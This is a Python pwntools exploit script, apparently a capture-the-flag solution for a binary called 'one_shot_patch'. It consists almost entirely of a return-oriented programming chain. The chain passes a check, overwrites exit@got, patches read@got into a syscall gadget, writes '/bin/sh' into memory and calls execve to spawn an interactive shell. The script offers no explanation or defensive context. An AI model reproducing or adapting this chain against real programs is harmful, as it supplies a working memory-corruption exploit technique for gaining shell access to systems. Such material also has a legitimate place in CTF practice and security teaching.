#!/usr/bin/env python
from pwn import *

elf = ELF("./one_shot_patch")
conn = process("./one_shot_patch")

check = 0x8a919ff0

exit_got = 0x601038
alarm_plt = 0x400520 

rdi_store_and_plus4 = 0x400665	# mov     [rbp+var_18], rdi
mov_eax = 0x004006f7 # mov eax, dword [rbp-0x0C] ; pop rbx ; pop rbp ; ret  ;  (1 found)
store_bss = 0x40079C #       mov     [rbp-4], eax

pop_rbp = 0x00400774
pop_rdi = 0x00400843 #pop rdi ; ret  ;  (1 found)
ret = 0x0040085c

ecx_set = 0x04006D8 #   movsx   ecx, [rbp+var_1D]

#0x004004ea: add byte [rax-0x7B], cl ; sal byte [rdx+rax-0x01], 0xFFFFFFD0 ; add rsp, 0x08 ; ret  ;  (1 found)
add_raxad = 0x004004ea

### check pass & exit@got overwrite => ret
payload =  p32(check)
payload += "\x00"*0x7c + p64(elf.bss()+200+0x18)
payload += p64(pop_rdi)
payload += p64(ret)
payload += p64(rdi_store_and_plus4)
payload += p64(0xdeadbeef)
payload += p64(elf.bss()+200+0x0c)
payload += p64(mov_eax)
payload += p64(0xdeadbeef)
payload += p64(exit_got + 0x4)
payload += p64(store_bss)

###make syscall
payload += p64(pop_rbp)
payload += p64(elf.bss()+0xF0+0x18)
payload += p64(pop_rdi)
payload += p64(0x60110e)
payload += p64(rdi_store_and_plus4)

payload += p64(pop_rbp)
payload += p64(elf.bss()+0x110+0x18)
payload += p64(pop_rdi)
payload += p64(elf.got['read']+0x7B)
payload += p64(rdi_store_and_plus4)

payload += p64(pop_rbp)
payload += p64(elf.bss()+0xF0+0x1D)
payload += p64(ecx_set)
payload += p64(0xdeadbeef)
payload += p64(elf.bss()+0x110+0x0c)
payload += p64(mov_eax)
payload += p64(0) # ebx
payload += p64(elf.bss()+0x40+0x4) #tmp
payload += p64(add_raxad)
payload += p64(0xdeadbeef)
#now close is syscall!

binsh00 = "\x2f\x62\x69\x6e\x2f\x73\x68\x00"

payload += p64(pop_rdi)
payload += binsh00
payload += p64(alarm_plt)
payload += p64(alarm_plt)
payload += p64(store_bss)
payload += p64(pop_rbp)
payload += p64(elf.bss()+0x44+0x4)
payload += p64(pop_rdi)
payload += binsh00[4:]+"\x00\x00\x00\x00"
payload += p64(alarm_plt)
payload += p64(alarm_plt)
payload += p64(store_bss)

pop_r12_15 = 0x0040083c #0x0040083c: pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret  ;  (1 found)
mov_rdx = 0x00400820	#mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8] ;  (1 found)

payload += p64(pop_rdi)
payload += p64(59)
payload += p64(alarm_plt)
payload += p64(alarm_plt)
payload += p64(pop_rbp)
payload += p64(1)
payload += p64(pop_r12_15)
payload += p64(elf.got['read'])
payload += p64(0)
payload += p64(0)
payload += p64(elf.bss()+0x40)
payload += p64(mov_rdx)

log.info("payload_len : %d <= 564" % len(payload))

conn.send(payload)
conn.interactive()